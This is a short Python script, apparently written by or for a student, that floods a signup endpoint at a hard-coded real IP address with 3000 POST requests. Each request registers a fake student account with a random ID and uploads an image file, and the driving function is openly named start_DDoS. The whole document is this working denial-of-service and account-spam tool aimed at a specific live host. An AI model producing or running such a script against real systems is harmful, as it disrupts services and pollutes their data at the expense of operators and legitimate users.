from requests import post
import string    
import random 

def random_string(length):
	return ''.join(random.choices(string.ascii_uppercase + string.digits, k = length))    

url = 'http://107.20.19.246:8080/stdSignup'

def send_post():

	data = {'std_id':random_string(20),'first_name':'Omar','last_name':'Mazen','password':'passwordD1!','confirm':'passwordD1','advisor':'2'}
	files = {'image': open('688.jpg','rb')}

	rsp = post(url,files=files,data=data)

	print(rsp,end='')

def start_DDoS(number_of_requests):
	for i in range(number_of_requests):
		send_post()
		print('==>',i)
start_DDoS(3000)
